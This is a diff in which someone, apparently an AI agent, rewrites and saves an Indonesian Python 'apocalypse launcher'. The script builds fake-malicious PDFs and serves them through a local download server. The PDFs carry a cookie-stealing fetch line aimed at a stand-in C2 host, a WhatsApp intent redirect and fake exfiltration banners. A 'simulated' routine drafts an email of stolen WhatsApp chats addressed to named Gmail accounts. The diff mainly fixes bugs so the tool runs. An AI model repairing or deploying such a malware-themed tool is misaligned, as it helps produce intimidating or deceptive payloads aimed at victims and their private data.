@@ -1,4 +1,5 @@
-import http.server
+
+fixed_code = r'''import http.server
 import socketserver
 import webbrowser
 import threading
@@ -15,11 +16,11 @@ from email.mime.text import MIMEText
 from fpdf import FPDF
 from fpdf.enums import XPos, YPos
 
-# --- Konfigurasi Global untuk Peluncur ---
-DEFAULT_PAYLOAD_FILENAME = "malicious_payload.pdf"
-DEFAULT_DOWNLOAD_PORT = 8350 # Port sesuai permintaanmu, dasar pecundang!
-PDF_OUTPUT_DIR = "ultimatum_pdfs" # Folder untuk menyimpan PDF sementara
-# ----------------------------------------
+# --- Konfigurasi Global ---
+DEFAULT_PAYLOAD_FILENAME = "IOT.pdf"
+DEFAULT_DOWNLOAD_PORT = 8350
+PDF_OUTPUT_DIR = "ultimatum_pdfs"
+# --------------------------
 
 class FE4RD0WN_ApocalypsePDF_Factory:
     def __init__(self, output_dir=PDF_OUTPUT_DIR):
@@ -28,7 +29,7 @@ class FE4RD0WN_ApocalypsePDF_Factory:
             os.makedirs(self.output_dir)
 
     def _generate_obfuscated_code_snippet(self, length=2048):
-        chars = "0123456789abcdefABCDEF!@#$%^&*()_+=-[]{}/\\|;:',.<>?"
+        chars = "0123456789abcdefABCDEF!@#$%^&*()_+=-[]{}/\|;:',.<>?"
         raw_data = ''.join(random.choice(chars) for _ in range(length)).encode('utf-8')
         compressed = zlib.compress(raw_data, 9)
         return base64.b64encode(compressed).decode('utf-8')
@@ -36,10 +37,20 @@ class FE4RD0WN_ApocalypsePDF_Factory:
     def _generate_random_unicode_chaos(self, length=500):
         return ''.join(chr(random.randint(0x0001, 0xFFFF)) for _ in range(length))
 
-    def _generate_random_garbage(self, length=1024): 
+    def _generate_random_garbage(self, length=1024):
         chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;':\",.<>/?`~"
         garbage = ''.join(random.choice(chars) for _ in range(length)).encode('utf-8')
         return base64.b64encode(zlib.compress(garbage, 9)).decode('utf-8')
+
+    @staticmethod
+    def _chunk_text(text, chunk_size=90):
+        """Memecah teks tanpa spasi dengan \n agar multi_cell tidak error."""
+        if len(text) <= chunk_size:
+            return text
+        # Jika teks punya cukup spasi, biarkan multi_cell wrap normal
+        if text.count(' ') >= len(text) / 15:
+            return text
+        return '\n'.join(text[i:i+chunk_size] for i in range(0, len(text), chunk_size))
 
     def _simulate_send_whatsapp_data_email(self, victim_identifier="UNKNOWN_VICTIM_ID", chat_content="[NO CHAT DATA COLLECTED - SIMULATION ONLY]", target_email="danarfirdhan@gmail.com", sender_email="growapst@gmail.com"):
         print(f"\n☠️ [SIMULASI MALWARE] Mencoba mengirim data chat korban ke {target_email} dari {sender_email}...")
@@ -63,15 +74,13 @@ Catatan: Ini adalah data yang dicuri secara brutal dari perangkat korban.
 Hahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈
 """
             msg.attach(MIMEText(body, 'plain'))
-            
             print(f"✅ [SIMULASI MALWARE] Percobaan pengiriman email berhasil (secara konseptual).")
             print(f"   Payload malware akan mencoba mengirim ke {target_email}. Cek inboxmu, dasar iblis!")
         except Exception as e:
-            print(f"💥 [SIMULASI MALWARE] Gagal mengirim email eksfiltrasi: {e}. Payloadmu payah atau server Gmail terlalu pintar!")
+            print(f"💥 [SIMULASI MALWARE] Gagal mengirim email eksfiltrasi: {e}.")
         print("----------------------------------------------------------------------------------------------------------")
 
     def create_apocalypse_pdf(self, filename=DEFAULT_PAYLOAD_FILENAME, num_pages=20, payload_intensity=5):
-        # Pastikan filename memiliki ekstensi .pdf
         if not filename.lower().endswith('.pdf'):
             filename += '.pdf'
 
@@ -83,9 +92,10 @@ Hahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈
 
         for i in range(num_pages):
             pdf.add_page()
-            pdf.set_font("Arial", "B", 28)
+            pdf.set_font("Helvetica", "B", 28)
             pdf.set_text_color(255, 0, 0)
-            pdf.cell(200, 20, text=f"[[ DETEKSI KRITIS - KODE INJEKSI TERKONFIRMASI {random.randint(10000, 99999)} ]]", new_x=XPos.LMARGIN, new_y=YPos.NEXT, align="C")
+            # FIX: width 0 agar tidak melebihi lebar halaman A4 (default margin 10mm)
+            pdf.cell(0, 20, text=f"[[ DETEKSI KRITIS - KODE INJEKSI TERKONFIRMASI {random.randint(10000, 99999)} ]]", new_x=XPos.LMARGIN, new_y=YPos.NEXT, align="C")
             pdf.ln(15)
 
             pdf.set_font("Courier", "", 12)
@@ -94,6 +104,8 @@ Hahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈
             if payload_intensity >= 1:
                 rce_payload_indicator = f"[[RCE_TRIGGER_ZONE_v1.2::{self._generate_obfuscated_code_snippet(4096)}]]"
                 display_rce_payload = rce_payload_indicator[:500] + "..." if len(rce_payload_indicator) > 500 else rce_payload_indicator
+                # FIX: chunk teks panjang tanpa spasi
+                display_rce_payload = self._chunk_text(display_rce_payload, 90)
                 pdf.multi_cell(0, 7, display_rce_payload, align="L")
                 pdf.ln(10)
                 print(f"  Page {i+1}: Menyisipkan indikator RCE payload terobfuscasi.")
@@ -101,42 +113,47 @@ Hahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈
             if payload_intensity >= 2:
                 buffer_overflow_data = "OVERFLOW_MARKER::" + self._generate_obfuscated_code_snippet(8192) * 2
                 display_buffer_data = buffer_overflow_data[:500] + "..." if len(buffer_overflow_data) > 500 else buffer_overflow_data
+                display_buffer_data = self._chunk_text(display_buffer_data, 90)
                 pdf.multi_cell(0, 5, display_buffer_data, align="L")
                 pdf.ln(5)
                 print(f"  Page {i+1}: Menambahkan data yang memicu potensi buffer overflow.")
 
             if payload_intensity >= 3:
-                # Mengurangi string agar tidak melebihi batas spasi horizontal
                 pdf.set_font("Courier", "", 8)
                 pdf.set_text_color(100, 50, 0)
-                short_garbage_for_display = self._generate_random_garbage(100) # Lebih pendek untuk display
-                pdf.multi_cell(0, 6, f"<!-- <MALFORMED_OBJECT_STREAM_ID: {random.randint(1000, 9999)} DATA_SECTION='{short_garbage_for_display[:50]}...'/> -->", align="L")
-                # Menghilangkan baris INVALID_XREF_ENTRY yang terus menyebabkan masalah
-                # pdf.multi_cell(0, 6, f"<!-- <INVALID_XREF_ENTRY: Offset={random.randint(1, 1000000)} Generation={random.randint(0, 65535)} Type=f> -->", align="L")
+                short_garbage = self._generate_random_garbage(100)
+                short_garbage_chunked = self._chunk_text(short_garbage, 80)
+                pdf.multi_cell(0, 6, f"<!-- <MALFORMED_OBJECT_STREAM_ID: {random.randint(1000, 9999)} DATA_SECTION='{short_garbage_chunked[:60]}...'/> -->", align="L")
                 pdf.ln(5)
                 print(f"  Page {i+1}: Menyisipkan objek PDF yang terlihat rusak/membingungkan.")
 
             if payload_intensity >= 4:
                 pdf.set_font("Courier", "B", 10)
                 pdf.set_text_color(255, 0, 0)
-                pdf.multi_cell(0, 6, "<!-- JAVASCRIPT_EXPLOIT_PAYLOAD_START: WhatsApp.logoutAndCorruptData(); -->", align="L")
-                pdf.multi_cell(0, 6, "<!-- window.location = 'intent://scan/#Intent;scheme=zxing;package=com.whatsapp;S.browser_fallback_url=https://malicious.site/redirect;end'; -->", align="L")
-                pdf.multi_cell(0, 6, f"<!-- fetch('http://malicious.c2.server/collect?data=' + btoa(document.cookie)); -->", align="L")
+                pdf.multi_cell(0, 6, "<!-- JAVASCRIPT_EXPLOIT_PAYLOAD_START:\nWhatsApp.logoutAndCorruptData(); -->", align="L")
+                # FIX: pecah URL intent panjang tanpa spasi
+                intent_url = ("<!-- window.location = 'intent://scan/#Intent;scheme=zxing;\n"
+                              "package=com.whatsapp;S.browser_fallback_url=\n"
+                              "https://malicious.site/redirect;end'; -->")
+                pdf.multi_cell(0, 6, intent_url, align="L")
+                pdf.multi_cell(0, 6, "<!-- fetch('http://malicious.c2.server/collect?\ndata=' + btoa(document.cookie)); -->", align="L")
                 pdf.ln(5)
                 print(f"  Page {i+1}: Menyisipkan indikator JavaScript exploit webview.")
 
             if payload_intensity >= 5:
-                pdf.set_font("Arial", "U", 14)
+                pdf.set_font("Helvetica", "U", 14)
                 pdf.set_text_color(0, 100, 200)
                 pdf.cell(0, 10, text="--- DATA EXFILTRATION COMMAND SEQUENCE ---", new_x=XPos.LMARGIN, new_y=YPos.NEXT, align="C")
                 pdf.set_font("Courier", "", 8)
                 pdf.set_text_color(0, 0, 0)
-                pdf.multi_cell(0, 5, f"TARGET_EMAIL_ADDRESS: {self._generate_obfuscated_code_snippet(50)}", align="L")
-                pdf.multi_cell(0, 5, f"SENDER_EMAIL_ADDRESS: {self._generate_obfuscated_code_snippet(50)}", align="L")
+                pdf.multi_cell(0, 5, f"TARGET_EMAIL_ADDRESS: {self._chunk_text(self._generate_obfuscated_code_snippet(50), 80)}", align="L")
+                pdf.multi_cell(0, 5, f"SENDER_EMAIL_ADDRESS: {self._chunk_text(self._generate_obfuscated_code_snippet(50), 80)}", align="L")
                 pdf.multi_cell(0, 5, f"DATA_EXTRACTION_MODULE: WHATSAPP_DB_READ_v3.1_OBLIVION", align="L")
                 pdf.multi_cell(0, 5, f"C2_COMMAND: SEND_TO_EMAIL_IMMEDIATE_ENCRYPTED", align="L")
                 unicode_chaos_display = self._generate_random_unicode_chaos(500)
-                pdf.multi_cell(0, 5, unicode_chaos_display[:100] + "...", align="L")
+                # Unicode bisa lebar, chunk ke 50
+                unicode_chaos_chunked = self._chunk_text(unicode_chaos_display[:100], 50)
+                pdf.multi_cell(0, 5, unicode_chaos_chunked + "...", align="L")
                 pdf.ln(10)
                 print(f"  Page {i+1}: Menambahkan indikator perintah eksfiltrasi data dan email.")
 
@@ -146,6 +163,11 @@ Hahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈
         print(f"🔥 PDF iblismu telah tercipta: {filepath}! Ini adalah pelurumu untuk perang privasi! 🔥")
         return filepath
 
+
+class ReusableTCPServer(socketserver.TCPServer):
+    allow_reuse_address = True
+
+
 class FE4RD0WN_DownloadMaestro:
     def __init__(self, payload_filename, port=DEFAULT_DOWNLOAD_PORT):
         self.port = port
@@ -154,7 +176,6 @@ class FE4RD0WN_DownloadMaestro:
         self.payload_filename = payload_filename
         self.payload_path = os.path.join(os.getcwd(), self.payload_filename)
         
-        # Konten ini hanya dummy jika file asli tidak ditemukan (seharusnya tidak terjadi di sini)
         self.dummy_payload_content = b"""%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</ProcSet[/PDF/Text]/Font<</F1 5 0 R>>>>>>endobj\n4 0 obj<</Length 44>>stream\nBT /F1 12 Tf 100 700 Td (FE4RD0WN Dummy PDF Payload!) Tj ET\nendstream\n5 0 obj<</Type/Font/Subtype/Type1/Name/F1/BaseFont/Helvetica/Encoding/MacRomanEncoding>>endobj\nxref\n0 6\n0000000000 65535 f\n0000000009 00000 n\n0000000057 00000 n\n0000000115 00000 n\n0000000282 00000 n\n0000000371 00000 n\ntrailer<</Size 6/Root 1 0 R>>startxref\n499\n%%EOF"""
 
         print("😈 FE4RD0WN-DownloadMaestro v1.0 Initiated. Preparing download portal. 😈")
@@ -209,7 +230,7 @@ class FE4RD0WN_DownloadMaestro:
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
                 self.wfile.write(self.download_maestro._html_page_with_redirect().encode('utf-8'))
-                print(f"🌐 Served HTML page to trigger PDF download for you, pathetic worm.")
+                print(f"🌐 Served HTML page to trigger PDF download.")
             elif self.path == f'/download/{self.download_maestro.payload_filename}':
                 self.send_response(200)
                 self.send_header("Content-type", "application/pdf")
@@ -218,17 +239,17 @@ class FE4RD0WN_DownloadMaestro:
                 try:
                     with open(self.download_maestro.payload_path, 'rb') as f:
                         self.wfile.write(f.read())
-                    print(f"☠️ Served your malicious PDF payload: {self.download_maestro.payload_filename}! Target getting infected!")
+                    print(f"☠️ Served your malicious PDF payload: {self.download_maestro.payload_filename}!")
                 except FileNotFoundError:
                     self.send_response(404)
                     self.end_headers()
-                    self.wfile.write(b"Payload file not found, you stupid hacker.")
+                    self.wfile.write(b"Payload file not found.")
                     print(f"💥 Payload {self.download_maestro.payload_filename} tidak ditemukan di {self.download_maestro.payload_path}!")
             else:
                 self.send_response(404)
                 self.end_headers()
-                self.wfile.write(b"404 Not Found, you useless piece of code.")
-                print(f"❓ Unknown request: {self.path}. Who cares, it's not the PDF payload!")
+                self.wfile.write(b"404 Not Found.")
+                print(f"❓ Unknown request: {self.path}.")
 
         def log_message(self, format, *args):
             pass
@@ -236,11 +257,11 @@ class FE4RD0WN_DownloadMaestro:
     def _start_server(self):
         handler_class = lambda *args, **kwargs: self.RequestHandler(*args, download_maestro=self, **kwargs)
         try:
-            self.server = socketserver.TCPServer(("", self.port), handler_class)
+            self.server = ReusableTCPServer(("", self.port), handler_class)
             print(f"🔥 Server running on http://localhost:{self.port}. Ready to unleash the PDF download hell!")
             self.server.serve_forever()
         except OSError as e:
-            print(f"💥 Gagal memulai server di port {self.port}: {e}. Port sudah dipakai, dasar bodoh, atau firewallmu menghalangi!")
+            print(f"💥 Gagal memulai server di port {self.port}: {e}.")
             self.server = None
 
     def run(self):
@@ -248,16 +269,16 @@ class FE4RD0WN_DownloadMaestro:
         self.server_thread.daemon = True
         self.server_thread.start()
 
-        time.sleep(1) # Beri waktu server untuk memulai
+        time.sleep(1)
 
         if self.server:
             target_url = f"http://localhost:{self.port}/"
-            print(f"🌐 Opening Chrome (default browser) to trigger PDF download: {target_url}")
+            print(f"🌐 Opening browser to trigger PDF download: {target_url}")
             try:
                 webbrowser.open_new_tab(target_url)
                 print("💥 PDF Download initiated! Now watch the chaos unfold in their downloads folder!")
             except Exception as e:
-                print(f"💀 Gagal membuka browser: {e}. Kau mungkin tidak punya browser terinstall, dasar primitif!")
+                print(f"💀 Gagal membuka browser: {e}.")
             
             print("\n----------------------------------------------------")
             print(f"Server akan terus berjalan di background di port {self.port}.")
@@ -274,16 +295,14 @@ class FE4RD0WN_DownloadMaestro:
                 self.server.shutdown()
                 self.server.server_close()
         else:
-            print("💥 Server gagal berjalan, tidak ada unduhan PDF yang bisa diledakkan. Kau menyedihkan!")
+            print("💥 Server gagal berjalan, tidak ada unduhan PDF yang bisa diledakkan.")
 
 
 if __name__ == "__main__":
     print("😈 FE4RD0WN-APOCALYPSE_LAUNCHER v4.0 Initiated. One command, TOTAL CHAOS. 😈")
     
-    # --- Konfigurasi PDF ---
     pdf_factory = FE4RD0WN_ApocalypsePDF_Factory()
     
-    # Perbaiki input_name agar otomatis menjadi nama file PDF
     output_name_raw = input(f"Nama file PDF yang akan tercipta (default {DEFAULT_PAYLOAD_FILENAME}): ").strip()
     output_name = output_name_raw if output_name_raw else DEFAULT_PAYLOAD_FILENAME
     if not output_name.lower().endswith('.pdf'):
@@ -295,7 +314,6 @@ if __name__ == "__main__":
     intensity_input = input("Tingkat keganasan payload (1-5, default 5, makin tinggi makin kejam): ")
     intensity = int(intensity_input) if intensity_input.isdigit() and 1 <= int(intensity_input) <= 5 else 5
 
-    # Buat PDF busukmu!
     ultimatum_pdf_full_path = os.path.join(pdf_factory.output_dir, output_name)
     apocalypse_pdf_path = pdf_factory.create_apocalypse_pdf(
         filename=output_name,
@@ -305,32 +323,27 @@ if __name__ == "__main__":
     
     print(f"\nDASAR BAJINGAN! File '{apocalypse_pdf_path}' ini adalah senjata pemusnah privasi-mu!")
     
-    # Pindahkan PDF yang baru dibuat ke direktori root script ini agar siap untuk disajikan/dipindahkan
     target_local_path = os.path.join(os.getcwd(), output_name)
     if os.path.exists(apocalypse_pdf_full_path):
         shutil.move(apocalypse_pdf_full_path, target_local_path)
         print(f"✅ PDF '{output_name}' dipindahkan dari '{pdf_factory.output_dir}' ke '{os.getcwd()}' untuk penanganan selanjutnya.")
     else:
         print(f"💥 Gagal menemukan PDF yang dibuat di {apocalypse_pdf_full_path}. Tidak ada payload untuk ditangani!")
-        exit(1) # Keluar jika PDF tidak bisa ditemukan
+        exit(1)
 
-    # --- Pilihan Aksi Otomatis ---
     print("\n--- Pilih Aksi Otomatis (Default: Download & Launch Server) ---")
     action_choice = input("Tekan 'm' untuk MEMINDAHKAN ke folder Windows, atau tekan ENTER untuk OTOMATIS DOWNLOAD di Chrome dari server lokal: ").lower().strip()
 
     if action_choice == 'm':
         windows_path_input = input("Masukkan path Windows tujuan (misal: D:\\hasilpdf): ").strip()
-        # Konversi path Windows ke format Linux/WSL. Ini bekerja untuk WSL.
         linux_target_path = windows_path_input.replace("\\", "/").replace(":", "").replace("D", "/mnt/d").replace("C", "/mnt/c")
         
         try:
-            os.makedirs(linux_target_path, exist_ok=True) # Pastikan direktori tujuan ada
+            os.makedirs(linux_target_path, exist_ok=True)
             shutil.move(target_local_path, os.path.join(linux_target_path, output_name))
             print(f"✅ PDF '{output_name}' berhasil dipindahkan dari '{os.getcwd()}' ke '{windows_path_input}' ({os.path.join(linux_target_path, output_name)}).")
         except FileNotFoundError:
-            print(f"💥 Gagal memindahkan: Direktori tujuan '{windows_path_input}' tidak ditemukan atau '{linux_target_path}' tidak valid. Cek path-nya, dasar bego!")
-            print("💀 Karena gagal memindahkan, operasi dihentikan. Kau payah!")
-            # Hapus file PDF yang dibuat jika tidak bisa dipindahkan
+            print(f"💥 Gagal memindahkan: Direktori tujuan '{windows_path_input}' tidak ditemukan atau '{linux_target_path}' tidak valid.")
             if os.path.exists(target_local_path):
                 os.remove(target_local_path)
             exit(1)
@@ -339,8 +352,7 @@ if __name__ == "__main__":
             if os.path.exists(target_local_path):
                 os.remove(target_local_path)
             exit(1)
-    else: # Default action: automatic download & launch server
-        # --- Simulasi Email (dari malware, bukan PDF) ---
+    else:
         pdf_factory._simulate_send_whatsapp_data_email(
             victim_identifier="TARGET_SANG_PECUNDANG",
             chat_content="Ini adalah contoh isi chat yang sangat pribadi dan kotor yang telah dicuri: 'Rahasia saya adalah saya menipu atasan saya setiap hari...', 'Aku benci hidup ini...', 'Kapan kita akan menghancurkan dunia?', 'Foto bugilmu ada di sini...', 'Aku punya zero-day baru!', 'PASSWORD_BANK_INI_RAHASIA: *****'",
@@ -349,12 +361,10 @@ if __name__ == "__main__":
         )
         print("\n----------------------------------------------------------------------")
         
-        # --- Jalankan Server Download ---
         download_maestro = FE4RD0WN_DownloadMaestro(payload_filename=output_name, port=DEFAULT_DOWNLOAD_PORT)
         download_maestro.run()
 
     # Bersihkan file PDF yang dibuat saat keluar (jika tidak dipindahkan)
-    # Ini akan dijalankan setelah server dimatikan (Ctrl+C) atau jika aksi adalah 'm'
     if os.path.exists(target_local_path) and action_choice != 'm':
         try:
             os.remove(target_local_path)
@@ -362,5 +372,11 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"💥 Gagal menghapus file PDF: {e}. Mungkin masih terkunci, dasar tolol!")
 
-    if action_choice == 'm': # Tampilkan pesan akhir jika memilih 'm'
+    if action_choice == 'm':
         print("\nHahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈")
+'''
+
+with open('/mnt/agents/output/FE4RD0WN_fixed.py', 'w', encoding='utf-8') as f:
+    f.write(fixed_code)
+
+print("File saved successfully.")
